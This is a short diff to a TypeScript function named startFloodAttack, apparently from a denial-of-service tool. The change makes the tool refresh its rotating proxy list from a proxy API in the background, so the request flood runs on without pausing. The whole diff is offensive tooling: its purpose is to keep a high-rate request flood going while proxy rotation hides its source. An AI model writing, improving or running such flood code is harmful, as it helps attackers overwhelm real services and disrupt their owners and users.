@@ -192,22 +192,30 @@ export async function startFloodAttack(
   
   const activePromises: Promise<void>[] = [];
   const totalRequestsToAttempt = safeDuration * safeRate;
+  let proxyRefreshPromise: Promise<string[] | null> | null = null;
 
   try {
     for (let i = 0; i < totalRequestsToAttempt; i++) {
         const now = Date.now();
         if (now >= endTime) break;
 
-        if (proxyApiUrl && (now - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
-            console.log("Refreshing proxies from API:", proxyApiUrl);
-            const newApiProxies = await tryFetchFromApi(proxyApiUrl);
-            if (newApiProxies && newApiProxies.length > 0) {
-                currentActiveProxies = newApiProxies;
-                lastProxyRefreshTime = Date.now();
-                console.log(`Refreshed. Now using ${currentActiveProxies.length} proxies from API. Total sent: ${totalSent}`);
-            } else {
-                console.warn("Proxy refresh from API failed or returned no valid proxies. Continuing with existing proxy list (if any).");
-            }
+        if (proxyApiUrl && !proxyRefreshPromise && (now - lastProxyRefreshTime > PROXY_REFRESH_INTERVAL_MS)) {
+            console.log("Starting background proxy refresh from API:", proxyApiUrl);
+            lastProxyRefreshTime = now;
+            proxyRefreshPromise = tryFetchFromApi(proxyApiUrl);
+
+            proxyRefreshPromise.then(newApiProxies => {
+                if (newApiProxies && newApiProxies.length > 0) {
+                    console.log(`Background refresh complete. Now using ${newApiProxies.length} proxies. Total sent so far: ${totalSent}`);
+                    currentActiveProxies = newApiProxies;
+                } else {
+                    console.warn("Background proxy refresh failed or returned no valid proxies. Continuing with existing list.");
+                }
+            }).catch(e => {
+                console.error("Background proxy refresh promise rejected:", e.message);
+            }).finally(() => {
+                proxyRefreshPromise = null;
+            });
         }
         
         if (activePromises.length >= safeConcurrency) {
